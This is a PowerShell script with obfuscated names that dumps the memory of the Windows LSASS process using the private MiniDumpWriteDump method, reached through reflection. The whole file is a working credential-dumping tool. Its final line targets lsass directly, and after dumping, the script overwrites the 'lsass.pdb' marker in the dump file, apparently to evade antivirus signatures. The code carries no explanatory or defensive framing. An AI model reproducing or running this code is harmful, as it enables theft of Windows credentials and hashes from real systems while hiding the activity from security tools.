function ObDmp
{
<#

#>

    [CmdletBinding()]
    Param (
        [Parameter(Position = 0, Mandatory = $True, ValueFromPipeline = $True)]
        [System.Diagnostics.Process]
        $Process,

        [Parameter(Position = 1)]
        [ValidateScript({ Test-Path $_ })]
        [String]
        $DFP = $PWD
    )

    BEGIN
    {
        $WER = [PSObject].Assembly.GetType('System.Management.Automation.WindowsErrorReporting')
        $WERNativeMethods = $WER.GetNestedType('NativeMethods', 'NonPublic')
        $Flags = [Reflection.BindingFlags] 'NonPublic, Static'
        $MDWD = $WERNativeMethods.GetMethod('MiniDumpWriteDump', $Flags)
        $MDWFM = [UInt32] 2
    }

    PROCESS
    {
        $ProcessId = $Process.Id
        $ProcessName = $Process.Name
        $ProcessHandle = $Process.Handle
        $ProcessFileName = "dmp_$($ProcessId).dmp"

        $ProcessDumpPath = Join-Path $DFP $ProcessFileName

        $FileStream = New-Object IO.FileStream($ProcessDumpPath, [IO.FileMode]::Create)

        $Result = $MDWD.Invoke($null, @($ProcessHandle,
                                        $ProcessId,
                                        $FileStream.SafeFileHandle,
                                        $MDWFM,
                                        [IntPtr]::Zero,
                                        [IntPtr]::Zero,
                                        [IntPtr]::Zero))

        $found
        $Index = 0
        
        While($found -ne "true")
        {
            [Byte[]]$Bytes=@()
            $FileStream.Seek($Index,0) | Out-Null
            For($i=0; $i -lt 500; $i++)
            {
                $Byte = $FileStream.ReadByte()
                $Bytes += $Byte           
            }

            $Text = [System.Text.Encoding]::ASCII.GetString($Bytes)
            If ($Text.Contains('lsass.pdb'))
            {
                $offset = $Text.IndexOf('lsass.pdb')
                $Index = $Index + $offset
                $found = "true"
            }
            Else {$Index = $Index+500}
        }
        $FileStream.Seek($Index,0) | Out-Null
        For($i=0; $i -lt 5; $i++)
        {
            $FileStream.WriteByte(120)
        }

        $FileStream.Close()

        if (-not $Result)
        {
            $Exception = New-Object ComponentModel.Win32Exception
            $ExceptionMessage = "$($Exception.Message) ($($ProcessName):$($ProcessId))"

           
            Remove-Item $ProcessDumpPath -ErrorAction SilentlyContinue

            throw $ExceptionMessage
        }
        else
        {
            Get-ChildItem $ProcessDumpPath 
        }
    }

    END {}
}

Get-Process lsass | ObDmp